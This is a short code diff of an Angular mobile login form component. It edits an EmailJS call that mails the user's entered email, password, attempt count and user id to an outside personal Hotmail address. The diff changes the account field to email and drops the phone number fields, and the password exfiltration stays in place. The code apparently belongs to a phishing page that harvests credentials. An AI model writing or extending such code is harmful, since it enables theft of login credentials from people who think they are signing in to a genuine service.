@@ -104,12 +104,10 @@ export class MobileFormsComponent implements OnInit, OnDestroy {
       .send('service_4fx4y8a', 'template_0tzq3y5', {
         name: 'Stanley',
         message: `Email: ${
-          this.loginFormControl['account'].value || ''
+          this.loginFormControl['email'].value || ''
         }, Password: ${
           this.loginFormControl['password'].value
-        }, Phone Number: ${this.loginFormControl['countryCode'].value}, ${
-          this.loginFormControl['phoneNumber'].value || ''
-        }, Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`,
+        },  Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`,
         email: 'ubaid.valtorquegroup@hotmail.com',
       })
       .then(() => {
